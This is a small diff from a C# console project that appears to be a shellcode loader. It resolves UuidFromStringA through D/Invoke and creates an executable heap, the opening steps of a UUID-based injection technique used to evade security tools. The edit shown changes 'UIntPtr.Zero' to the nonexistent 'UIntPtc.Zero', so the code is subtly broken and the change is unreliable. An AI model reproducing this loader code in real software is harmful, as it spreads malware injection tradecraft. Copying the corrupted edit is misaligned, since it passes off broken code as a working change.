@@ -90,7 +90,7 @@ namespace USEConsole
             IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");
 
             // 1. Heap Create + Alloc 
-            object[] heapCreateParam = { (uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero };
+            object[] heapCreateParam = { (uint)0x00040000, UIntPtr.Zero, UIntPtc.Zero };
             var heapHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapCreate, typeof(DELEGATE.HeapCreate), ref heapCreateParam);
             Console.WriteLine("[>] Allocated Heap address - 0x{0}", heapHandle.ToString("x2"));
 
